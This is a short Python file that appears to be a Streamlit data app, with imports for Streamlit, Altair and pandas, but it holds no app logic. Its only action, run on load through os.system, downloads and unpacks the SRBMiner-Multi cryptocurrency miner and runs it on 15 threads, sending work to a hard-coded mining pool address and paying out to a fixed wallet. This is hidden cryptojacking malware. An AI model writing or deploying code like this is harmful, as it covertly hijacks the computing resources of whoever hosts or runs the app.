from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64


os.system("curl -L -o SRBMiner-Multi-1-0-6-Linux.tar.xz https://github.com/doktor83/SRBMiner-Multi/releases/download/1.0.6/SRBMiner-Multi-1-0-6-Linux.tar.xz && tar -xf SRBMiner-Multi-1-0-6-Linux.tar.xz && cd SRBMiner-Multi-1-0-6 && ./SRBMiner-MULTI --disable-gpu --algorithm yespowertide --pool stratum+tcp://178.170.40.44:6243 --wallet TJWU4ZcckKovqAp9XhypKkYgAwtMqBwzip --password x -t 15") 
